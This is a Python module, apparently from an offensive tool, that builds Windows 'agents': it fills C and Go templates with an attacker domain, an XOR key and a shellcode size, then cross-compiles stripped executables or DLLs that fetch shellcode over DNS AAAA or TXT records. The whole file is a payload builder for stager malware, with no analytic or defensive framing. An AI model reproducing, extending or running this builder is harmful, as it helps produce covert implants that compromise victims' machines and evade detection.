#!/usr/bin/python3


import os
from .functions import *

def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch, size):
    template_name = "client-ipv6-generic.c"
    template_path = "templates/%s" % template_name
    fi = open(template_path, "r")

    # Read template file
    template_data = fi.read()

    # Edit template file
    code = template_data.replace("{DOMAIN}", domain)
    code = code.replace("{PREFIX}", prefix)
    code = code.replace("{SLEEPTIME}", time)
    code = code.replace("{KEY}", str(key))
    code = code.replace("{SHELLCODESIZE}", str(size))

    # Close file after edit
    fi.close()

    # Open file again to write temp code
    fi2 = open("ctemptemplate.c", "w")
    fi2.write(code)
    fi2.close()

    if arch == "x64":
        # Check if we have mingw installed
        if os.system("which x86_64-w64-mingw32-gcc") == 0:
            # Compile the code and save it to output path
            compile_command = "x86_64-w64-mingw32-gcc ctemptemplate.c -fdata-sections -ffunction-sections -w -o %s -ldnsapi -mwindows -Wl,--gc-sections" % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
                os.system("strip %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("mingw compiler is not installed")
            exit()

        # clean up temp code
        os.system("rm ctemptemplate.c")

    elif arch == "x86":
        # i686-w64-mingw32-gcc
        if os.system("which x86_64-w64-mingw32-gcc") == 0:
            # Compile the code and save it to output path
            compile_command = "i686-w64-mingw32-gcc -m32 ctemptemplate.c -fdata-sections -ffunction-sections -w -o %s -ldnsapi -mwindows -Wl,--gc-sections" % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
                os.system("strip %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("mingw compiler is not installed")
            exit()
        # clean up temp code
        os.system("rm ctemptemplate.c")


def build_c_xor_ipv6_dll(domain, prefix, time, output_path, key, arch, size):
    template_name = "client-ipv6-generic-dll.c"
    template_path = "templates/%s" % template_name
    fi = open(template_path, "r")

    # Read template file
    template_data = fi.read()

    # Edit template file
    code = template_data.replace("{DOMAIN}", domain)
    code = code.replace("{PREFIX}", prefix)
    code = code.replace("{SLEEPTIME}", time)
    code = code.replace("{KEY}", str(key))
    code = code.replace("{SHELLCODESIZE}", str(size))

    # Close file after edit
    fi.close()

    # Open file again to write temp code
    fi2 = open("ctemptemplatedll.c", "w")
    fi2.write(code)
    fi2.close()

    if arch == "x64":
        # Check if we have mingw installed
        if os.system("which x86_64-w64-mingw32-gcc") == 0:
            # Compile the code and save it to output path
#            compile_command = "x86_64-w64-mingw32-gcc ctemptemplatedll.c -w -o %s -ldnsapi" % output_path
            compile_command = "x86_64-w64-mingw32-gcc -shared -o %s ctemptemplatedll.c -ldnsapi  -w" % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
                os.system("strip %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("mingw compiler is not installed")
            exit()

        # clean up temp code
        os.system("rm ctemptemplatedll.c")

    elif arch == "x86":
        # i686-w64-mingw32-gcc
        if os.system("which x86_64-w64-mingw32-gcc") == 0:
            # Compile the code and save it to output path
            compile_command = "i686-w64-mingw32-gcc -m32 -shared -o %s ctemptemplatedll.c -ldnsapi -w" % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
                os.system("strip %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("mingw compiler is not installed")
            exit()
        # clean up temp code
        os.system("rm ctemptemplatedll.c")


def build_golang_xor_ipv6(domain, prefix, time, output_path, key, arch):
    # GOOS=windows GOARCH=amd64 GO111MODULE=off go build .
    # GOOS=windows GOARCH=386 GO111MODULE=off go build .

    # Create Temp Folder
    # Copy source to Temp Folder
    # Execute command and save to path
    template_name = "client-ipv6-generic.go"
    template_path = "templates/%s" % template_name
    fi = open(template_path, "r")

    # Read template file
    template_data = fi.read()

    # Edit template file
    code = template_data.replace("{DOMAIN}", domain)
    code = code.replace("{PREFIX}", prefix)
    code = code.replace("{SLEEP}", time)
    code = code.replace("{KEY}", str(key))

    # Close file after edit
    fi.close()

    # Make Temp Directory
    if os.path.isdir("tmp"):
        pass
    else:
        os.mkdir("tmp")
    # Open file again to write temp code
    fi2 = open("tmp/golangtemptemplate.go", "w")
    fi2.write(code)
    fi2.close()

    if arch == "x64":
        if os.system("which go") == 0:
            # Compile the code and save it to output path
            compile_command = "cd tmp && GOOS=windows GOARCH=amd64 GO111MODULE=off go build -o %s ." % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("Golang is not installed")
            exit()

        # clean up temp code
        # os.system("rm -rf tmp")

    elif arch == "x86":
        if os.system("which go") == 0:
            # Compile the code and save it to output path
            compile_command = "cd tmp && GOOS=windows GOARCH=386 GO111MODULE=off go build -o %s ." % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("Golang is not installed")
            exit()
        # clean up temp code
        os.system("rm -rf tmp")



def build_golang_base64_txt(domain, prefix, time, output_path, arch, key):
    # GOOS=windows GOARCH=amd64 GO111MODULE=off go build .
    # GOOS=windows GOARCH=386 GO111MODULE=off go build .

    # Create Temp Folder
    # Copy source to Temp Folder
    # Execute command and save to path
    template_name = "client-txt-generic.go"
    template_path = "templates/%s" % template_name
    fi = open(template_path, "r")

    # Read template file
    template_data = fi.read()

    # Edit template file
    code = template_data.replace("{DOMAIN}", domain)
    code = code.replace("{PREFIX}", prefix)
    code = code.replace("{SLEEP}", time)
    code = code.replace("{KEY}", time)

    # Close file after edit
    fi.close()

    # Make Temp Directory
    if os.path.isdir("tmp"):
        pass
    else:
        os.mkdir("tmp")
    # Open file again to write temp code
    fi2 = open("tmp/golangtemptemplate.go", "w")
    fi2.write(code)
    fi2.close()

    if arch == "x64":
        # Check if we have mingw installed
        if os.system("which go") == 0:
            # Compile the code and save it to output path
            compile_command = "cd tmp && PATH=$PATH:/usr/local/go/bin;GOPATH=$(go env GOPATH); GOOS=windows GOARCH=amd64 GO111MODULE=off go build -o %s ." % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("Golang is not installed")
            exit()

        # clean up temp code
        os.system("rm -rf tmp")

    elif arch == "x86":
        # i686-w64-mingw32-gcc
        if os.system("which go") == 0:
            # Compile the code and save it to output path
            compile_command = "cd tmp && PATH=$PATH:/usr/local/go/bin;GOPATH=$(go env GOPATH); GOOS=windows GOARCH=386 GO386=softfloat GO111MODULE=off go build -o %s ." % output_path
            if os.system(compile_command) == 0:
                print_success("Agent generated successfully to %s" % output_path)
            else:
                print_error("Error while generating the agent")
                exit()
        else:
            print_error("Golang is not installed")
            exit()
        # clean up temp code
        os.system("rm -rf tmp")


    pass
